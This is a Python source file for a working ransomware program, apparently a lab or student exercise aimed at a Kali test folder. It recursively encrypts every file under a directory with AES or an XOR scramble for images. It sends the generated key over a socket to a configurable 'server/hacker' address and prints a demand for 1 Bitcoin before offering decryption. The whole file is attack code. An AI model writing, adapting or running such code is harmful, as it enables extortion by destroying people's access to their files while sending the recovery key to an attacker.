import hashlib
from Crypto import Random
from Crypto.Cipher import AES
from base64 import b64encode, b64decode
import sys
import os
import socket
import random

class AESCipher(object):
		
    imageExt=["jpg","jpeg","png","mp4","mp3","pdf"]	
    def __init__(self, key):
	    	
	#sending data to the server/hacker
        HOST = '127.0.0.1' #Enter reciver address
        PORT = 65435
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        	s.connect((HOST, PORT))
        	s.sendall(bytes(key,"utf-8"))
        	data = s.recv(1024)
        	s.close()

        self.block_size = AES.block_size
        self.key = hashlib.sha256(key.encode()).digest()
        #print("key: {0}".format(self.key))
   #     print(type(self.key))
	        

#Recursivly opening the file and folders    
    def EncryptLinux(self,currPath):
    	arr = os.listdir(currPath)
    	for i in arr:
    		path = currPath+"/"+str(i)
    		if(os.path.isfile(path)):
    			
    			#print("found file {0}".format(path))
    			
    			#Extracting file extension
    			if(self.checkImage(path)):
    				self.encryptImage(path)
    				#self.decryptImage(path)
    			else:
	    			#Reading file and settings its data to string form
	    			
	    			file_data = self.readFile(path)
	  	 
	    			#sending the data to the Encryption 
	    			file_data = self.encrypt(file_data)
	    			
	    			#setting the encrypted datat to the original file
	    			self.writeFile(path,file_data)
			
    		#Directory found so recursivly opening it 
    		if(os.path.isdir(path)):
    			#print("its a dir {0}".format(path))
    			self.EncryptLinux(path)


    def De(self,strr,currPath):
    	print("###########################################################################################################\n\n")
    	print("					Your Files are Encrypted\n\n						       ") 
    	print("				   Send 1 Bitconin to Following address							")
    	print("			 	 Address: 982749237842481203840234028934 \n\n"						)
    	print("################################################################################################################\n\n")
    	passphrase = input("Enter key to decrypt your files")
    	strr = hashlib.sha256(strr.encode()).digest()
    	new_key = hashlib.sha256(passphrase.encode()).digest()
    	if(new_key==strr):
    		print("correct key")
    		self.DecryptLinux(currPath)
    
    
    def DecryptLinux(self,currPath):
    	
    #	print("called me")
    #	print(currPath)
    	arr = os.listdir(currPath)
    	for i in arr:
    		path = currPath+"/"+str(i)
    		if(os.path.isfile(path)):
    			
    			print("found file {0}".format(path))
    			
    			#Extracting file extension
    			if(self.checkImage(path)):
    				self.decryptImage(path)
    			else:
	  			#Reading file and settings its data to string form
	    			
	    			file_data = str(self.readFile(path))
	    			
	    			#sending the data to the Decryption    			
	    			file_data = self.decrypt(file_data)
	    			    			
	    			#setting the encrypted datat to the original file
	    
	    			self.writeFile(path,file_data)
			
    		#Directory found so recursivly opening it 
    		if(os.path.isdir(path)):
    			print("its a dir {0}".format(path))
    			self.DecryptLinux(path)

    	
    	
#Encryupting the file
    def encrypt(self, plain_text):
        plain_text = self.__pad(plain_text)
        iv = Random.new().read(self.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        encrypted_text = cipher.encrypt(plain_text.encode())
        return b64encode(iv + encrypted_text).decode("utf-8")

#Decrypting the file 
    def decrypt(self, encrypted_text):
    #	print("entring sucessfull")
    	encrypted_text = b64decode(encrypted_text)
    #	print("decrypted text generated")
    	iv = encrypted_text[:self.block_size]
    #	print("iv generated");
    	cipher = AES.new(self.key, AES.MODE_CBC, iv)
    #	print("cipher is ready")
    	plain_text = cipher.decrypt(encrypted_text[self.block_size:]).decode("utf-8")
    #	print("plain text is ready")
    	return self.__unpad(plain_text)

#padding the data to multiple of 128bits of AES also
    def __pad(self, plain_text):
        number_of_bytes_to_pad = self.block_size - len(plain_text) % self.block_size
        ascii_string = chr(number_of_bytes_to_pad)
        padding_str = number_of_bytes_to_pad * ascii_string
        padded_plain_text = plain_text + padding_str
        return padded_plain_text
        
#unpadding the data to get multiple of AES
    @staticmethod
    def __unpad(plain_text):
        last_character = plain_text[len(plain_text) - 1:]
        return plain_text[:-ord(last_character)]

#Reading the file        
    def readFile(self,path):
     	 with open(path,'r') as file:
     	 	original = file.read()
     	 #original = bytes(original,'utf-8')
     	 return original;
     	 
#Writing the file
    def writeFile(self,path,file_data):
     	 with open(path,'w') as file:
     	 	file.write(file_data)


#checking if file is a image
    def checkImage(self,path):
    	flag = False;
    	ext = path.split(".")[1]
    	for i in self.imageExt:
    		if(ext==i):
    			flag = True;
    			break;
    	return flag	
    	#self.encryptImage(path)
    	#self.decryptImage(path)
			
#encrypting the image file
    def encryptImage(self,path):
    	file =  open(path,"rb")
    	image = file.read()
    	file.close()
    	image = bytearray(image)
    	key = 48;
    	for i,j in enumerate(image):
    		image[i] = key^j
    	file = open(path,"wb")
    	file.write(image)
     	 	
#decrypting the image file    
    def decryptImage(self,path):
    	file =  open(path,"rb")
    	image = file.read()
    	file.close()
    	image = bytearray(image)
    	key = 48;
    	for i,j in enumerate(image):
    		image[i] = j^key
    	file = open(path,"wb")
    	file.write(image)
     	 	
		

#Generating the key of the algo   	
mylist = ["a", "b", "c","d", "e", "f","g", "h", "i","j", "k", "l","m", "n", "o",
"p", "q", "r","s", "t", "u","v", "w", "x","y", "z", "A","B", "C", "D",
"E", "F", "G","H", "I", "J","K", "L", "M","N", "O", "P","Q", "R", "S",
"T", "U", "V","W", "X", "Y","Z", "1", "2","3", "4", "5","6", "7", "8",
"9", "0","!","@","#","$","%","^","&","*","(",")","-","_","+","=","{","[","]","}",
]

random.shuffle(mylist)
strr = ""
ra = random.randint(10,80)
print(ra)
for i in range(ra):
	strr=strr+mylist[i];	

aes = AESCipher(strr)
aes.EncryptLinux("/home/kali/TestFolder");	
aes.De(strr,"/home/kali/TestFolder")

